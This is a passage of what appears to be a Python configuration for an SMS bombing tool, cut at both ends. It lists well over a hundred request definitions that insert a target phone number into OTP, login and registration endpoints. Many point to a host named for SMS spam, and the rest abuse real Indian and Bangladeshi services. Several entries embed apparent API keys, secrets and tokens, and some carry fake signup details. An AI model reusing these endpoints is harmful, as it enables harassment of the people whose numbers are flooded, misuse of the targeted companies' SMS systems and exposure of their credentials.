        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api22?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 23",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api23?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 24",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api24?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 25",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api25?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 26",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api26?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 27",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api27?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 28",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api28?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 29",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api29?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 30",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api30?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 31",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api31?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 32",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api32?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 33",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api33?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 34",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api34?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 35",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api35?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 36",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api36?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 37",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api37?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 38",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api38?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 39",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api39?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 40",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api40?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 41",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api41?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 42",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api42?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 43",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api43?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 44",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api44?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 45",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api45?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 46",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api46?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 47",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api47?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 48",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api48?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 49",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api49?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 50",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api50?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 51",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api51?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 52",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api52?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 53",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api53?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 54",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api54?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 55",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api55?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 56",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api56?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 57",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api57?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 58",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api58?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 59",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api59?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 60",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api60?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 61",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api61?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 62",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api62?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 63",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api63?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 64",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api64?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 65",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api65?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 66",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api66?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 67",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api67?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 68",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api68?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 69",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api69?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 70",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api70?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 71",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api71?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 72",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api72?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 73",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api73?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 74",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api74?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 75",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api75?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 76",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api76?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 77",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api77?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 78",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api78?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 79",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api79?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 80",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api80?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 81",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api81?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 82",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api82?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 83",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api83?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 84",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api84?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 85",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api85?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 86",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api86?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 87",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api87?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 88",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api88?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 89",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api89?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 90",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api90?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 91",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api91?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 92",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api92?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 93",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api93?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 94",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api94?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 95",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api95?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 96",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api96?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 97",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api97?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 98",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api98?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 99",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api99?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 100",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api100?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 101",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api101?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 102",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api102?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 103",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api103?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 104",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api104?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 105",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api105?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 106",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api106?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 107",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api107?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 108",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api108?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 109",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api109?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "LMNX9 API 110",
        "type": "SMS",
        "url": lambda phone: f"https://lmnx9-sms-spam-v11.onrender.com/api110?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 1",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "GX api 2",
        "type": "SMS",
        "url": lambda phone: f"https://apu-inky.vercel.app/send?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 3",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "GX api 4",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "GX api 5",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "GX api 6",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "GX api 7",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "GX api 8",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "GX api 9",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "GX api 10",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "GX api 11",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "GX api 12",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "GX api 13",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "GX api 14",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # --- GET Method APIs ---
    {
        "name": "GX api 15",
        "type": "SMS",
        "url": lambda phone: f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 16",
        "type": "SMS",
        "url": lambda phone: f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 17",
        "type": "SMS",
        "url": lambda phone: f"https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 18",
        "type": "SMS",
        "url": lambda phone: f"https://api.medeasy.health/api/send-otp/+88{phone}/",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 19",
        "type": "SMS",
        "url": lambda phone: f"http://ultranetrn.com.br/fonts/api.php?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 20",
        "type": "SMS",
        "url": lambda phone: f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 21",
        "type": "SMS",
        "url": lambda phone: f"https://ss.binge.buzz/otp/send/login{phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 22",
        "type": "SMS",
        "url": lambda phone: f"https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login",
        "method": "GET",
        "headers": {},
        "data": None
    },

    # --- POST Method APIs ---
    {
        "name": "GX api 23",
        "type": "SMS",
        "url": "https://app.deshal.net/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "GX api 24",
        "type": "SMS",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "GX api 25",
        "type": "SMS",
        "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"","language":"en"}}'
    },
    {
        "name": "GX api 26",
        "type": "SMS",
        "url": "https://api.busbd.com.bd/api/auth",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}"}}'
    },
    {
        "name": "GX api 27",
        "type": "SMS",
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"full_name":"Apk","email_address":"apkzone2.0@gmail.com","company_name":"Ahgbd","phone_number":"{phone}"}}'
    },
    {
        "name": "GX api 28",
        "type": "SMS",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","deviceToken":"web","language":"en","os":"web"}}'
    },
    {
        "name": "GX api 29",
        "type": "SMS",
        "url": "https://api.apex4u.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },
    {
        "name": "GX api 30",
        "type": "SMS",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"login"}}'
    },
    {
        "name": "GX api 31",
        "type": "SMS",
        "url": "https://fundesh.com.bd/api/auth/generateOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "GX api 32",
        "type": "SMS",
        "url": "https://user-api.jslglobal.co/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}}'
    },
    {
        "name": "GX api 33",
        "type": "SMS",
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "GX api 34",
        "type": "SMS",
        "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "GX api 35",
        "type": "SMS",
        "url": "https://auth.qcoom.com/api/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"+88{phone}"}}'
    },
    {
        "name": "GX api 36",
        "type": "SMS",
        "url": "https://api.garibookadmin.com/api/v4/user/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}}'
    },
    {
        "name": "GX api 37",
        "type": "SMS",
        "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "GX api 38",
        "type": "SMS",
        "url": "https://api.shikho.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"ap-discount-request"}}'
    },
    {
        "name": "GX api 39",
        "type": "SMS",
        "url": "https://core.easy.com.bd/api/v1/registration",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"apkzone2.0info@gmail.com","mobile":"{phone}","password":"amitusar","password_confirmation":"amitusar","device_key":"b2c8ddd3be..."}}'
    },
    {
        "name": "GX api 40",
        "type": "SMS",
        "url": "https://da-api.robi.com.bd/da-nll/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "GX api 41",
        "type": "SMS",
        "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","requestType":"send","emailConsent":true,"whatsappConsent":true}}'
    },
    {
        "name": "GX api 42",
        "type": "SMS",
        "url": "https://app.addatimes.com/api/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"BD"}}'
    },
    {
        "name": "GX api 43",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/otp-generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","verification_code":""}}'
    },
    {
        "name": "GX api 44",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"User","email":"user@example.com","phone":"{phone}","password":"password123"}}'
    },
    {
        "name": "GX api 45",
        "type": "SMS",
        "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"email":"apkzone2.0@gmail.com","phone_number":"88{phone}"}}'
    },
    {
        "name": "GX api 46",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/otp-request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "GX api 47",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/regnewcustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"fukc@gmail.com","phone":"{phone}","password":"aAeMY@5hG8iUfD4","password_confirmation":"aAeMY@5hG8iUfD4"}}'
    },
    {
        "name": "GX api 48",
        "type": "SMS",
        "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"device_uuid":"...","firebase_token":"...","geo_location":"...","mno":"Grameenphone","wallet_number":"{phone}"}}'
    },
    {
        "name": "GX api 49",
        "type": "SMS",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
